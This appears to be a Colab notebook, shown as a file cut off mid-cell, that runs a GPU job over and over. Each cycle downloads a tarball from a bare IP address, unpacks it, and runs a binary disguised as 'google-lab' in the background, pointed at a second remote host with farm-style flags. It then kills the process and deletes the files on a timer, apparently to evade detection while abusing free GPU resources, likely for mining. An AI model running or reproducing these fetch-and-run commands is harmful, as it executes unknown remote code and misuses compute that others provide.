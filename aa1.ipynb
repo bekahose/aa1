{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "aa1",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU",
    "gpuClass": "standard"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "AZRPK-Y4J7wQ"
      },
      "outputs": [],
      "source": [
        "!nvidia-smi"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "NERdqG8EzgKb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Bks4rX5ozNRA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "_7NRdDRYzVbV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "w__O7a10zSzJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "I8eyitUM0cge"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "NKu9JKX5fnHg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "MBU1QN4QfnHh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "6XqT4T_7fnHh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "1S7ETDTJfnHh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "RvV3rqR3fnHh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "H8ZRUF62fnNj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "HOtquYbwfnNj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "TYmlc0GXfnNj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "7pfqMoo_fnNj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "GMKpO8m7fnNj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "0md2Hb7kfnRp"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "37fyI7-dfnRq"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "Ciir-gYbfnRq"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "eI3ylnG4fnRq"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "aCk-aUFqfnRq"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "z4tWq0_ifnV1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "zNnRE7bLfnV1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "I_79guZ_fnV1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "a7BIMxD2fnV1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "BAVjoSaVfnV1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "z1uOAVDXfnZJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "nbO1-sdafnZJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "5EjIPdajfnZJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "sfu0LRGIfnZJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "sd7d-wHefnZJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "pijRiqE2fnc7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "s5u8mdTgfnc7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "FRwuYZZjfnc7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "TiHuviqzfnc7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "yuRT2sX8fnc7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "uI6MVpEFfngY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "MRoN3Af8fngZ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "Ze25JBSqfngZ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "fbWLP8pPfngZ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "O8_FeOjTfngZ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "ORv4Em2SfnkA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "bIxGRqWFfnkA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "3rsC8QWofnkA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "kSgmFm-YfnkA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "R9RkdDOefnkA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "hqU_9pBtfnnP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "njmIw9W0fnnP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "hYLDC6A1fnnP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "_1WeIdpAfnnP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "BztIHepsfnnP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "bvHdHkHRfnrE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "FysvdnAnfnrE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "x5GNECSwfnrE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "l2J0wYm3fnrE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "vYsFf_SFfnrE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "0uhQOWdVfnua"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "IbeACkwGfnua"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "n6z6uMFAfnub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "Af-qR6tNfnub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "4oMhEjCgfnub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "7bZDhU2nfnxx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "_DHY1es3fnxx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "vYQnLvIrfnxx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "-UlG_1dsfnxx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "qCYMDpP0fnxy"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "vzf3Gho8fn1a"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "P3y5iaNJfn1b"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "Hvm6ODf7fn1b"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "svYZBYpyfn1b"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "NSpvQrSlfn1b"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "dBdWD6zffn48"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "aBNRJpxwfn48"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "cRBLhbN3fn48"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "AGbN-FGmfn48"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "cxrsGJ9tfn48"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "Lk0BdIvgfn80"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "n2sSNi-Mfn80"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "qrVG93gcfn80"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "eBoEagUUfn80"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "kWZxjWUkfn81"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "JUA9w4IvfoA6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "iCE7ALKYfoA7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "kTnZVy_TfoA7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "hMfeaBBsfoA7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "f25cuTQyfoA7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "Vos6jgagfoEh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "1jcSPRnUfoEh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "oJTYCTprfoEh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "-8_SxKeIfoEh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "-DLJA-sCfoEi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "9sv2L2hcfoIe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "m1t3-oJDfoIe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "10LFVffWfoIe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "9sHwcvTjfoIf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Ym9YFFMjfoIf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "5S703QJtfoNI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "EkE7w4RAfoNI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "FSHVLGflfoNI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "8hAKyegGfoNI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "loUVkZbmfoNI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "J_D5zfpMfoR_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "GWocRN4efoR_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "HsuCI8ArfoR_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "UCP11HbRfoR_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "aF3U05nDfoR_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "Q4GNjUvifoWd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "G2DWuadZfoWd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "bbWzKtiJfoWe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "UXDckevDfoWe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
